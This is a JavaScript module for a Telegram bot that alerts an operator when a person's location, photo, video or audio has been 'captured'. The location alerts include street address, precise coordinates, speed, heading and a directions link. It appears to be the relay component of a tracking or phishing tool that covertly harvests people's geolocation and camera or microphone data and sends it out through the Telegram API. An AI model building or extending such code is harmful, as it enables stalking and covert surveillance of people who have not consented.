/**
 * ============================================
 * Telegram Notification Service
 * ============================================
 * Sends notifications to Telegram users when events occur.
 */

const logger = require('../utils/logger');
const config = require('../config');

// Store bot instance reference
let botInstance = null;

/**
 * Set the bot instance for sending messages
 * @param {Object} bot - Telegraf bot instance
 */
const setBotInstance = (bot) => {
    botInstance = bot;
};

/**
 * Format location message for Telegram
 * @param {Object} locationInfo - Complete location info
 * @param {Object} session - Session data
 * @returns {string} Formatted message
 */
const formatLocationMessage = (locationInfo, session) => {
    const { coordinates, address, maps } = locationInfo;
    
    let message = `📍 <b>LOCATION CAPTURED!</b>\n\n`;
    
    // Address section
    message += `📌 <b>Address:</b>\n`;
    message += `${address.formatted || address.displayName}\n\n`;
    
    // Detailed address components
    if (address.street || address.houseNumber) {
        const streetAddr = [address.houseNumber, address.street].filter(Boolean).join(' ');
        if (streetAddr) message += `🏠 Street: ${streetAddr}\n`;
    }
    if (address.neighborhood) message += `🏘️ Area: ${address.neighborhood}\n`;
    if (address.city) message += `🌆 City: ${address.city}\n`;
    if (address.state) message += `🗺️ State: ${address.state}\n`;
    if (address.country) message += `🌍 Country: ${address.country} ${address.countryCode ? `(${address.countryCode})` : ''}\n`;
    if (address.postalCode) message += `📮 Postal Code: ${address.postalCode}\n`;
    
    message += `\n`;
    
    // Coordinates section
    message += `🎯 <b>Coordinates:</b>\n`;
    message += `├ Latitude: <code>${coordinates.latitude.toFixed(6)}</code>\n`;
    message += `├ Longitude: <code>${coordinates.longitude.toFixed(6)}</code>\n`;
    
    if (coordinates.accuracy) {
        message += `├ Accuracy: ${coordinates.accuracy.toFixed(1)}m\n`;
    }
    if (coordinates.altitude) {
        message += `├ Altitude: ${coordinates.altitude.toFixed(1)}m\n`;
    }
    if (coordinates.speed) {
        message += `├ Speed: ${(coordinates.speed * 3.6).toFixed(1)} km/h\n`;
    }
    if (coordinates.heading) {
        message += `├ Heading: ${coordinates.heading.toFixed(0)}°\n`;
    }
    
    message += `\n`;
    
    // Timestamp
    const captureTime = new Date(locationInfo.timestamp).toLocaleString();
    message += `🕐 <b>Captured:</b> ${captureTime}\n\n`;
    
    // Maps links
    message += `🗺️ <b>View on Maps:</b>\n`;
    message += `<a href="${maps.googleMaps}">📍 Open in Google Maps</a>\n`;
    message += `<a href="${maps.googleMapsDirections}">🧭 Get Directions</a>`;
    
    return message;
};

/**
 * Send location notification to Telegram user
 * @param {number} telegramId - Telegram user ID
 * @param {Object} locationInfo - Complete location info
 * @param {Object} session - Session data
 */
const sendLocationNotification = async (telegramId, locationInfo, session) => {
    try {
        // Use HTTP API to send message if bot instance not available
        const message = formatLocationMessage(locationInfo, session);
        
        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
        
        if (!botToken) {
            logger.error('No Telegram bot token available for notifications');
            return false;
        }
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: false
            })
        });
        
        const result = await response.json();
        
        if (!result.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        logger.info('Location notification sent to Telegram', { 
            telegramId, 
            sessionId: session?.id 
        });
        
        return true;
        
    } catch (error) {
        logger.error('Failed to send location notification', { 
            telegramId, 
            error: error.message 
        });
        return false;
    }
};

/**
 * Send photo notification to Telegram user
 * @param {number} telegramId - Telegram user ID
 * @param {string} photoPath - Path to the photo file
 * @param {Object} session - Session data
 */
const sendPhotoNotification = async (telegramId, photoPath, session) => {
    try {
        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
        
        if (!botToken) {
            logger.error('No Telegram bot token available for notifications');
            return false;
        }
        
        const message = `📸 <b>PHOTO CAPTURED!</b>\n\n🕐 Time: ${new Date().toLocaleString()}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        logger.info('Photo notification sent to Telegram', { telegramId });
        return true;
        
    } catch (error) {
        logger.error('Failed to send photo notification', { error: error.message });
        return false;
    }
};

/**
 * Send video notification to Telegram user
 * @param {number} telegramId - Telegram user ID
 * @param {Object} session - Session data
 */
const sendVideoNotification = async (telegramId, session) => {
    try {
        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
        
        if (!botToken) {
            return false;
        }
        
        const message = `🎥 <b>VIDEO CAPTURED!</b>\n\n🕐 Time: ${new Date().toLocaleString()}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return true;
        
    } catch (error) {
        logger.error('Failed to send video notification', { error: error.message });
        return false;
    }
};

/**
 * Send audio notification to Telegram user
 * @param {number} telegramId - Telegram user ID
 * @param {Object} session - Session data
 */
const sendAudioNotification = async (telegramId, session) => {
    try {
        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
        
        if (!botToken) {
            return false;
        }
        
        const message = `🎤 <b>AUDIO CAPTURED!</b>\n\n🕐 Time: ${new Date().toLocaleString()}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return true;
        
    } catch (error) {
        logger.error('Failed to send audio notification', { error: error.message });
        return false;
    }
};

module.exports = {
    setBotInstance,
    formatLocationMessage,
    sendLocationNotification,
    sendPhotoNotification,
    sendVideoNotification,
    sendAudioNotification
};
